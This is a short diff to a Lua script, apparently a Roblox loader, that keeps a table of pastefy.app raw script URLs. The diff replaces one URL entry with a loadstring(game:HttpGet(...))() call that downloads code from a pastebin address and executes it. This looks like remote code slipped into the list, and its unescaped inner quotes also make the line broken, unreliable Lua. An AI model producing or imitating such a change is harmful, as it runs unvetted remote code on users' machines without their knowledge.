@@ -851,7 +851,7 @@ local scriptUrls = {
     "https://pastefy.app/xV1T3PGk/raw",
     "https://pastefy.app/xV1T3PGl/raw",
     "https://pastefy.app/xV1T3PGm/raw",
-    "https://pastefy.app/xV1T3PGn/raw",
+    "loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()",
     "https://pastefy.app/xV1T3PGo/raw",
     "https://pastefy.app/xV1T3PGp/raw"
 }
